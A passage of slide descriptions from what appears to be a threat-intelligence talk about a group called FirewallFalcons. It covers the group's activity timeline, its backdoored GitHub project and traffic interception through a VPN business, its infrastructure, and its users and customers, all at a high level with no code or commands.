One track is drawn, labelled **FirewallFalcons** at the left margin: an orange arrow with an arrowhead at each end, spanning almost the full width. Two avatars sit on it, left of centre — the FIREWALL FALCONS falcon logo and the Telegram logo. Over its right-hand portion a black brace spans from about the middle to the right end, its stem rising to a **FirewallFalcons GROUP** avatar.

## Slide 134

**ACTIVITY TIMELINE**

The axis rule now carries four date labels, left to right: **NOVEMBER 2024**, **JANUARY 2025**, **NOVEMBER 2025**, **AUGUST 2026**.

Two tracks are drawn, each an orange arrow with an arrowhead at each end:

- **FirewallFalcons** — spanning almost the full width, with the FIREWALL FALCONS falcon logo and the Telegram logo on it left of centre, and a black brace over its right-hand portion whose stem rises to a **FirewallFalcons GROUP** avatar.
- **89.168.51.93** — a shorter track beneath, starting about a fifth of the way in and running to the right end, with a server-stack icon on it near the middle.

## Slide 135

**ACTIVITY TIMELINE**

The axis rule now carries five date labels, left to right: **NOVEMBER 2024**, **JANUARY 2025**, **MAY 2025**, **NOVEMBER 2025**, **AUGUST 2026**.

Three tracks are drawn, each an orange arrow with an arrowhead at each end:

- **FirewallFalcons** — spanning almost the full width, with the FIREWALL FALCONS falcon logo and the Telegram logo on it left of centre, and a black brace over its right-hand portion whose stem rises to a **FirewallFalcons GROUP** avatar.
- **89.168.51.93** — starting about a fifth of the way in and running to the right end, with a server-stack icon on it near the middle.
- **thefirewoods.org** — starting later still and running to the right end, with a globe icon on it just right of the server icon above.

## Slide 136

**ACTIVITY TIMELINE**

The axis rule now carries seven date labels, left to right: **NOVEMBER 2024**, **JANUARY 2025**, **MAY 2025**, **JUNE 2025**, **NOVEMBER 2025**, **MAY 2026**, **AUGUST 2026**.

Four tracks are drawn, each an orange arrow with an arrowhead at each end:

- **FirewallFalcons** — spanning almost the full width, with the FIREWALL FALCONS falcon logo and the Telegram logo on it left of centre, and a black brace over its right-hand portion whose stem rises to a **FirewallFalcons GROUP** avatar.
- **89.168.51.93** — starting about a fifth of the way in and running to the right end, with a server-stack icon on it near the middle.
- **thefirewoods.org** — starting later still and running to the right end, with a globe icon on it.
- **FirewallFalcons** — a fourth, shorter track from about JUNE 2025 to about MAY 2026, with a GitHub mark on it at about NOVEMBER 2025. Two black braces sit above it, side by side: the left one labelled **Backdoor**, the right one labelled **MITM**; they meet at the GitHub mark.

## Slide 137

**ACTIVITY TIMELINE**

The axis rule now carries eight date labels, left to right: **NOVEMBER 2024**, **JANUARY 2025**, **MAY 2025**, **JUNE 2025**, **NOVEMBER 2025**, **MAY 2026**, **JUNE 2026**, **AUGUST 2026**.

Five tracks are drawn, each an orange arrow with an arrowhead at each end:

- **FirewallFalcons** — spanning almost the full width, with the FIREWALL FALCONS falcon logo and the Telegram logo on it left of centre, and a black brace over its right-hand portion whose stem rises to a **FirewallFalcons GROUP** avatar.
- **89.168.51.93** — starting about a fifth of the way in and running to the right end, with a server-stack icon on it near the middle.
- **thefirewoods.org** — starting later still and running to the right end, with a globe icon on it.
- **FirewallFalcons** — from about JUNE 2025 to about MAY 2026, with a GitHub mark on it at about NOVEMBER 2025, and the two braces above it labelled **Backdoor** (left) and **MITM** (right).
- **FirewallFalcons** — a fifth, short track running from about JUNE 2026 to just past AUGUST 2026, with a round blue-and-white mark on it.

Two vertical blue dashed lines are drawn between the fourth and fifth tracks: one at the right end of the fourth track (about MAY 2026) and one at the left end of the fifth (about JUNE 2026).

## Slide 138

**THE INFRASTRUCTURE**

A layered diagram, drawn top to bottom:

- Top right: a purple cloud labelled **INTERNET**. A purple cylinder labelled **ENCRYPTED** runs from a single server-stack icon on its left to the cloud.
- A full-width purple cylinder labelled **ENCRYPTED**.
- Beneath it, a row of **four** server-stack icons, and beneath that a row of **eight** server-stack icons.
- A second full-width purple cylinder labelled **ENCRYPTED**.
- At the foot of the slide, a row of client devices — phones, tablets and laptops, all with blank black screens.

No arrows or connecting lines are drawn between the layers; the tunnels are the labelled cylinders.

## Slide 139

**THE INFRASTRUCTURE**

The previous slide's diagram with two things added at the top: a hooded figure at a laptop (skull on the screen) replacing the single server icon, and a red cylinder labelled **VPN TUNNEL CAN TERMINATE HERE** drawn between two server-stack icons, directly beneath the figure.

Layer by layer, top to bottom:

- Top right: a purple cloud labelled **INTERNET**, with a purple cylinder labelled **ENCRYPTED** to its left, running from the hooded figure.
- The red cylinder **VPN TUNNEL CAN TERMINATE HERE**, a server icon at each end.
- A full-width purple cylinder labelled **ENCRYPTED**.
- A row of **four** server-stack icons, and beneath it a row of **eight** server-stack icons.
- A second full-width purple cylinder labelled **ENCRYPTED**.
- A row of client devices — phones, tablets and laptops with blank black screens.

## Slide 140

**WHO ARE THE FIREWALL FALCON USERS**

- Commercial SSH/WebSocket VPN subscription
- Cheap VPS
- Free internet
- Streaming

Along the foot of the slide, six blurred channel cards, each captioned with a subscriber count: **2,677 subscribers**, **6,131 subscribers**, **4,569 subscribers**, **136 subscribers**, **4,676 subscribers**, **370 subscribers**. Everything else on those cards is blurred out.

## Slide 141

**WHO ARE THE FIREWALL FALCON USERS**

- Commercial SSH/WebSocket VPN subscription
- Cheap VPS
- Free internet
- Streaming

A blurred social-profile screenshot has been added to the right of the bullets. Only three fragments are left legible: **4,578 posts**, **77.1K followers** and the category line **Game Publisher**.

Along the foot of the slide, the same six blurred channel cards: **2,677 subscribers**, **6,131 subscribers**, **4,569 subscribers**, **136 subscribers**, **4,676 subscribers**, **370 subscribers**.

## Slide 142

**WHO ARE THE CUSTOMERS OF THE FIREWALL FALCON USERS**

A world choropleth, brightest across North Africa, the Middle East and South Asia and darkest across the Americas, Europe, East Asia and Oceania. The map carries no legend, scale or country labels.

## Slide 143

A four-panel meme, filling the slide; no title, and no other text on the page.

| Panel | Caption |
|---|---|
| 1 | REGULAR INTERNET |
| 2 | CHEAP VPN |
| 3 | RUNNING VPN BUSINESS |
| 4 | TRAFFIC MITM |

Each caption sits beside a cartoon of the same character growing progressively more muscular. A small `imgflip.com` watermark is in the bottom-left corner of the meme.

## Slide 144

# THANK YOU

## QUESTIONS?

Two QR codes side by side, each with a caption beneath and a small icon above its top-left corner:

- **Blog** — the flare four-point star icon
- **LinkedIn** — the LinkedIn "in" icon

To the right, the pink and blue Care Bears again, puzzled, with orange question marks over their heads.

